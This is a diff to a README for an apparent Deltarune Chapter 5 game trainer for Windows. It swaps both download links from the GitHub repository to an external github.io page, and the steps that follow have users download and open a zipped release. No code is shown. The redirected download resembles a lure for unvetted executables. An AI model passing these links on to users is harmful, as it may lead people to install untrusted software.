@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Utility - Enhance your single player exploration experience
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/dishachau6029/Deltarune-Chapter5-Trainer-Utility)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://dishachau6029.github.io)
 
 ## 📖 About this tool
 
@@ -23,7 +23,7 @@ This utility works only with single-player sessions. Do not use this tool in onl
 
 Follow these steps to set up the trainer on your Windows computer.
 
-1. Visit the repository page to download the software: [Download Deltarune-Chapter 5 Trainer Utility](https://github.com/dishachau6029/Deltarune-Chapter5-Trainer-Utility).
+1. Visit the repository page to download the software: [Download Deltarune-Chapter 5 Trainer Utility](https://dishachau6029.github.io).
 2. Locate the most recent release on the right side of the page under the Releases section.
 3. Download the zipped file to your computer.
 4. Open the folder where you saved the file.
